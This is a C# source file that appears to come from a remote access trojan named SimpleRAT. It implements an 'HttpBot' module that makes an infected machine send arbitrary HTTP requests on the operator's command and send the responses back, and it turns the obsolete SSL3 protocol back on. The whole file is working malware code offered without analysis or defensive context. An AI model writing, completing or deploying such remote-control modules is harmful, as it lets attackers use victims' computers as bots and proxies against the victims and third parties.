using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using SimpleRAT.Communication;
using SimpleRAT.Communication.ResponseTypes;

namespace SimpleRAT.Features
{
    public class HttpBot : BaseFeature
    {
        public static HttpBot Instance => new HttpBot();

        protected HttpBot() : base(Commands.PerformHttpRequest)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls
        | SecurityProtocolType.Tls11
        | SecurityProtocolType.Tls12
        | SecurityProtocolType.Ssl3;
        }

        public override void Handle(Context context)
        {
            if (!context.Request.Arguments.ContainsKey("http.method"))
            {
                context.Response.AddError(Commands.PerformHttpRequest, "Missing parameter \"http.method\"");
                return;
            }
            if (!context.Request.Arguments.ContainsKey("http.url"))
            {
                context.Response.AddError(Commands.PerformHttpRequest, "Missing parameter \"http.url\"");
                return;
            }
            var method = context.Request.Arguments["http.method"];
            var url = context.Request.Arguments["http.url"];
            var data = context.Request.Arguments.ContainsKey("http.data") ? context.Request.Arguments["http.data"] : null;

            var request = (HttpWebRequest)HttpWebRequest.Create(url);
            request.Method = method;
            if (data != null)
            {
                var _data = Convert.FromBase64String(data);
                using (var str = request.GetRequestStream())
                    str.Write(_data, 0, _data.Length);
            }
            var response = (HttpWebResponse)request.GetResponse();
            if (response.ContentLength > 0)
            {
                using (var mem = new MemoryStream())
                {
                    using (var str = response.GetResponseStream())
                        str.CopyTo(mem);
                    data = Convert.ToBase64String(mem.ToArray());
                }
            }

            var headers = response.Headers.AllKeys.Select(x => new KeyValuePair<string, string>(x, response.Headers[x])).ToDictionary(x => x.Key, x => x.Value);
            context.Response.Content["http.result"] = new HttpInfo()
            {
                Headers = headers,
                Data = data
            };
        }
    }
}
